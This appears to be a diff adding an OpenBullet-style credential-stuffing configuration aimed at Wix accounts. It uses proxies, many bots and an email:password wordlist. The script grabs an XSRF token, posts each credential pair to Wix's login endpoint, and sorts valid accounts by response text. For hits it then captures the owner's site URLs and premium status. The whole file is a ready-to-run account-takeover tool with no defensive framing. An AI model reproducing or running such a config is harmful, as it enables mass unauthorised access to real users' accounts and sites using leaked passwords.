@@ -1,0 +1,66 @@
+[SETTINGS]
+{
+  "Name": "Wix",
+  "SuggestedBots": 100,
+  "LastModified": "2018-05-30T21:58:45.9371048+00:00",
+  "AdditionalInfo": "",
+  "Author": "Train & MaStErChO(FIX)",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://users.wix.com/signin" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://users.wix.com/" 
+  HEADER "Origin: https://users.wix.com" 
+PARSE "<COOKIES(XSRF-TOKEN)>" LR "" "" Recursive=FALSE -> VAR "XSRF" "" "" 
+REQUEST POST "https://users.wix.com/auth/v2/login" AutoRedirect=TRUE 
+  CONTENT "email=<USER>&password=<PASS>&rememberMe=true&ldSessionID=&originView=desktop&urlThatUserRedirectedFrom=&overrideLocale=en&language=en" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "User-Agent: Mozilla/5.0 (WindowMozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36 OPR/53.0.2907.68" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-XSRF-TOKEN: <XSRF>" 
+  HEADER "X-NewRelic-ID: VgUDU15ACQoGUFRQAQ==" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success AND 
+    KEY "success\":true" 
+    KEY "status\":\"ACTIVE" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid password" 
+    KEY "No such email" 
+    KEY "Password size must be between 4 and 100" 
+REQUEST GET "https://www.wix.com/my-account" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "id\":\"" "\"" Recursive=FALSE -> VAR "id" "" "" 
+REQUEST GET "https://www.wix.com/_api/sites-list/sites/<id>" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-XSRF-TOKEN: <XSRF>" 
+PARSE "<SOURCE>" LR "viewUrl\":\"" "\"" Recursive=FALSE -> CAP "URL" "" "" 
+PARSE "<SOURCE>" LR "premium\":" "," Recursive=FALSE -> CAP "Premium" "" "" 
